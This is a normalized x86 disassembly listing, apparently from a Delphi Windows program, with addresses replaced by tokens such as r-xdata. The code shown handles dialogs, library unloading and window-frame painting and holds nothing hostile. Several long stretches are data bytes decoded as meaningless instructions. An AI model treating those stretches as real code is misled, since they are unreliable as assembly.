push sub_435e8d
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov eax [ ebp - 0x4 ]
call sub_441f54
mov esi eax
mov eax ebx
call sub_441f54
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4209c4
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_45d1d8
call sub_460954
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_4248ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45c628
mov eax [ ebp - 0x4 ]
call sub_441f98
mov esi eax
mov eax ebx
call sub_441f98
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4209dc
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_45d1d8
call sub_460920
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_4248ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45c658
add eax 0x3
sub_435ef8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x44 ] eax
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax r-xdata
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx GetSaveFileNameA
mov eax ebx
call sub_429e1c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_435f3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_435f87
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4242a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4044a0
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f8e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_435f94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435fb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435fc0
retn
sub_435fdb
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_436020
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436027
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b1c
sub_436043
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_436088
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43608f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b1c
sub_43609f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4360f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4360fc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404094
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_436108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43614c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436153
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_436160
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436185
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43618c
retn
sub_4361c5
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x62 ] dh
inc ebx
add [ edx + 0x540b0043 ] al
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] bh
add [ eax ] al
nop
push sub_436307
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43630e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ad0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ad0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_436298
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436307
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43630e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ad0
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ad0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_436560
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_427b5c
mov [ esi + 0x5 ] al
call sub_436238
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_436ed8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4365ac
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_43664c
call sub_42799c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4365e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43664c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_436690
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4366e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43672c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_436770
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4367b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_436820
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4048e0
push eax
mov eax esi
call sub_4048d0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4365e0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_436884
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_436908
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_436944
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4369e0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_4369fd ]
jmp [ eax * 4 + jump_table_436a66 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_436d6c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_436ec7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_436908
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43672c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412f04
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_436ef4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436f2f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436f36
retn
mov eax [ rw-data ]
call sub_403344
mov eax rw-data
call sub_404094
sub_436f40
mov [ edi + 0x43 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4370 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] bl
inc ebx
add [ edx + 0x70 ] dh
inc ebx
add [ eax ] dl
add al [ eax ]
add ah dh
0xa5200043 0x41
sub_437238
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax - 0xfffffff ] dl
jo r-xdata
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
inc ecx
add [ ecx + 0x43 ] bl
add [ eax ] ah
xor eax 0x351c0044
inc esp
add ah ch
xor eax 0x18940044
inc esp
add al bl
pop ds
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ ebp + 0x43 ] bh
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0x78 ]
mov [ 0xffffffffa1f40043 ] eax
inc ebx
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
and [ ebx + 0x43 ] dh
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ edx + 0x43 ] 0x0
or al 0x72
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
sub [ eax + 0x46900044 ] ah
inc esp
add [ eax - 0x4bffbbc6 ] cl
dec ecx
inc ecx
add [ esp + 0x43 ] dh
add [ esi + 0x43 ] bl
add [ ecx + ebx + 0x23380044 ] cl
inc esp
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add [ edi ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
adc [ eax ] 0x0
pop es
inc ebx
salc
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
je r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
pushad
movsd [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add [ edi + ecx * 8 ] al
inc ebx
add [ ebx ] bl
add bh bh
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
jo r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd465646f
aad 0x43
add [ eax + 0x25 ] dl
inc esp
add [ eax - 0x67ffbbdb ] al
inc ebp
inc esp
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
sub al 0xd6
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
inc ecx
add [ ecx + eax ] ch
jmp [ eax - 0x5b ]
add bh bh
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x43ceec73
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jmp [ ebp + 0x10043 ]
jae r-xdata
add bh bh
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
jl r-xdata
outsd
insb
add al 0xb9
inc ecx
add [ eax ] ch
add bh bh
inc esp
inc esp
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add [ eax + 0x43070010 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
cwde
movsd [ edi ] [ esi ]
inc ebx
add ah dl
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
inc eax
add [ ecx - 0x5f010000 ] bl
inc esp
add [ eax + 0x26 ] ch
inc esp
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
outsb
jae r-xdata
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
sbb eax [ ebp ]
jl r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xc4ff0000 0x4426
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
jo r-xdata
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
inc ebx
push 0x10007261
insb
jo r-xdata
je r-xdata
outsb
